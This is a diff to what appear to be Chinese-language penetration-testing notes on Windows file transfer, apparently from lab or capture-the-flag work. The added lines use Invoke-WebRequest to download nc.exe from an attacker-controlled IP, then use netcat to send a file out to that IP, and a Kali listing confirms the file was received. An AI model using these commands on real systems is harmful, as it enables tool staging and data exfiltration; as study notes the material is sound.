@@ -76,8 +76,26 @@ dir
                2 Dir(s)   4,617,351,168 bytes free
 ```
 
+### Invoke-WebRequest
+
+```bash
+Invoke-WebRequest -Uri 'http://10.10.16.58/nc.exe' -OutFile 'C:\Utils\nc.exe'
+```
+
 ### 传出文件
 
 ```bash
 download
+```
+
+
+```bash
+PS C:\Utils> cmd /c "C:\Utils\nc64.exe 10.10.16.58 408 < C:\Utils\out.txt"
+cmd /c "C:\Utils\nc64.exe 10.10.16.58 408 < C:\Utils\out.txt"
+```
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ls -liah out.txt 
+2782113 -rw-rw-r-- 1 kali kali 127K Mar 17 09:10 out.txt
 ```
